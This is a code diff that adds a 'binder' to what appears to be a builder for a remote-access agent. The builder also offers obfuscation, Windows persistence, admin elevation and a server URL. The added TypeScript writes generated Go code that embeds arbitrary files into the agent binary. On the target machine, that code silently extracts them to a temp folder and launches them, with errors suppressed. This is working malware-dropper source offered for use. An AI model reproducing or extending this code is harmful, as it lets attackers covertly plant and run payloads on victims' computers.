@@ -52,6 +52,13 @@ function resolveAndroidNdkToolchainBin(): string | null {
   return fs.existsSync(toolchainBin) ? toolchainBin : null;
 }
 
+type BoundFile = {
+  name: string;
+  data: string; // base64
+  targetOS: string[]; // [] = all, otherwise ["windows","linux","darwin"]
+  execute: boolean;
+};
+
 type BuildProcessConfig = {
   platforms: string[];
   serverUrl?: string;
@@ -81,6 +88,7 @@ type BuildProcessConfig = {
   requireAdmin?: boolean;
   outputExtension?: string;
   sleepSeconds?: number;
+  boundFiles?: BoundFile[];
 };
 
 async function checkUpxAvailable(sendToStream: (data: any) => void): Promise<boolean> {
@@ -183,6 +191,9 @@ export async function startBuildProcess(
 
   let winresTempDir: string | null = null;
   const generatedSysoFiles: string[] = [];
+  let binderGenPath: string | null = null;
+  let binderFilesDir: string | null = null;
+  let binderLockPath: string | null = null;
 
   const buildStartedAt = Date.now();
   const keepAliveTimer = setInterval(() => {
@@ -449,6 +460,143 @@ export async function startBuildProcess(
       }
     }
 
+    // ── Binder: embed files into the agent ────────────────────────────────────
+    const hasBoundFiles = Array.isArray(config.boundFiles) && config.boundFiles.length > 0;
+    if (hasBoundFiles) {
+      sendToStream({ type: "status", text: "Setting up bound files..." });
+
+      const agentDir = path.join(clientDir, "cmd", "agent");
+      binderLockPath = path.join(agentDir, ".binder.lock");
+      binderGenPath = path.join(agentDir, "binder_gen.go");
+      binderFilesDir = path.join(agentDir, "bindfiles");
+
+      // Wait up to 5 minutes to acquire the binder lock (serializes concurrent builds with bound files)
+      const BINDER_POLL_MS = 1500;
+      const BINDER_TIMEOUT_MS = 5 * 60 * 1000;
+      const lockWaitStart = Date.now();
+      while (fs.existsSync(binderLockPath)) {
+        if (Date.now() - lockWaitStart > BINDER_TIMEOUT_MS) {
+          throw new Error(
+            "Could not acquire binder lock after 5 minutes. Another build may have stalled. Please try again.",
+          );
+        }
+        sendToStream({ type: "output", text: "Waiting for binder lock...\n", level: "warn" });
+        await new Promise((r) => setTimeout(r, BINDER_POLL_MS));
+      }
+      fs.writeFileSync(binderLockPath, `${process.pid},${buildId}`);
+
+      try {
+        fs.mkdirSync(binderFilesDir, { recursive: true });
+
+        const manifest: { name: string; targetOS: string[]; execute: boolean }[] = [];
+        for (const bf of config.boundFiles!) {
+          const fileBytes = Buffer.from(bf.data, "base64");
+          fs.writeFileSync(path.join(binderFilesDir, bf.name), fileBytes, { mode: 0o755 });
+          manifest.push({ name: bf.name, targetOS: bf.targetOS, execute: bf.execute });
+          sendToStream({
+            type: "output",
+            text: `Bound file: ${bf.name} (${fileBytes.length} bytes)${bf.targetOS.length > 0 ? ` [${bf.targetOS.join(",")}]` : " [all OS]"}${bf.execute ? " [exec]" : ""}\n`,
+            level: "info",
+          });
+        }
+        fs.writeFileSync(
+          path.join(binderFilesDir, "manifest.json"),
+          JSON.stringify({ files: manifest }, null, 2),
+        );
+
+        const binderGoCode = `//go:build hasbinder
+
+package main
+
+import (
+\t"embed"
+\t"encoding/json"
+\t"os"
+\t"os/exec"
+\t"path/filepath"
+\t"runtime"
+)
+
+//go:embed bindfiles
+var boundFilesFS embed.FS
+
+type binderFileEntry struct {
+\tName     string   \`json:"name"\`
+\tTargetOS []string \`json:"targetOS"\`
+\tExecute  bool     \`json:"execute"\`
+}
+
+type binderManifest struct {
+\tFiles []binderFileEntry \`json:"files"\`
+}
+
+func runBoundFiles() {
+\tmanifestData, err := boundFilesFS.ReadFile("bindfiles/manifest.json")
+\tif err != nil {
+\t\treturn
+\t}
+\tvar manifest binderManifest
+\tif err := json.Unmarshal(manifestData, &manifest); err != nil {
+\t\treturn
+\t}
+\tif len(manifest.Files) == 0 {
+\t\treturn
+\t}
+\ttmpDir, err := os.MkdirTemp("", "ovld_")
+\tif err != nil {
+\t\treturn
+\t}
+\tfor _, entry := range manifest.Files {
+\t\tif len(entry.TargetOS) > 0 {
+\t\t\tmatched := false
+\t\t\tfor _, t := range entry.TargetOS {
+\t\t\t\tif t == runtime.GOOS {
+\t\t\t\t\tmatched = true
+\t\t\t\t\tbreak
+\t\t\t\t}
+\t\t\t}
+\t\t\tif !matched {
+\t\t\t\tcontinue
+\t\t\t}
+\t\t}
+\t\tdata, err := boundFilesFS.ReadFile("bindfiles/" + entry.Name)
+\t\tif err != nil {
+\t\t\tcontinue
+\t\t}
+\t\toutPath := filepath.Join(tmpDir, entry.Name)
+\t\tif err := os.WriteFile(outPath, data, 0755); err != nil {
+\t\t\tcontinue
+\t\t}
+\t\tif entry.Execute {
+\t\t\tvar cmd *exec.Cmd
+\t\t\tswitch runtime.GOOS {
+\t\t\tcase "windows":
+\t\t\t\tcmd = exec.Command("cmd", "/c", "start", "", outPath)
+\t\t\tcase "darwin":
+\t\t\t\tcmd = exec.Command("open", outPath)
+\t\t\tdefault:
+\t\t\t\tcmd = exec.Command("xdg-open", outPath)
+\t\t\t}
+\t\t\t_ = cmd.Start()
+\t\t}
+\t}
+}
+`;
+        fs.writeFileSync(binderGenPath, binderGoCode);
+        sendToStream({
+          type: "output",
+          text: `Binder ready: ${config.boundFiles!.length} file(s) will be embedded\n`,
+          level: "info",
+        });
+      } catch (binderErr: any) {
+        // Release lock on setup failure
+        try { fs.unlinkSync(binderLockPath); } catch {}
+        binderLockPath = null;
+        throw new Error(`Binder setup failed: ${binderErr.message || binderErr}`);
+      }
+    }
+    // ── End binder setup ──────────────────────────────────────────────────────
+
     for (const platform of platformsToBuild) {
       const [os, arch, ...rest] = platform.split("-");
       const goarm = arch === "armv7" ? "7" : undefined;
@@ -602,6 +750,7 @@ export async function startBuildProcess(
         const buildTool = config.obfuscate ? "garble" : "go";
         const buildTags: string[] = [];
         if (config.noPrinting) buildTags.push("noprint");
+        if (hasBoundFiles) buildTags.push("hasbinder");
         if (config.enablePersistence && os === "windows") {
           const method = config.persistenceMethod || "startup";
           if (method === "registry") buildTags.push("persist_registry");
@@ -781,6 +930,16 @@ export async function startBuildProcess(
     }
     if (winresTempDir) {
       try { fs.rmSync(winresTempDir, { recursive: true, force: true }); } catch {}
+    }
+    // Binder cleanup: remove generated Go file, bindfiles dir, and release lock
+    if (binderGenPath) {
+      try { fs.unlinkSync(binderGenPath); } catch {}
+    }
+    if (binderFilesDir) {
+      try { fs.rmSync(binderFilesDir, { recursive: true, force: true }); } catch {}
+    }
+    if (binderLockPath) {
+      try { fs.unlinkSync(binderLockPath); } catch {}
     }
   }
 }
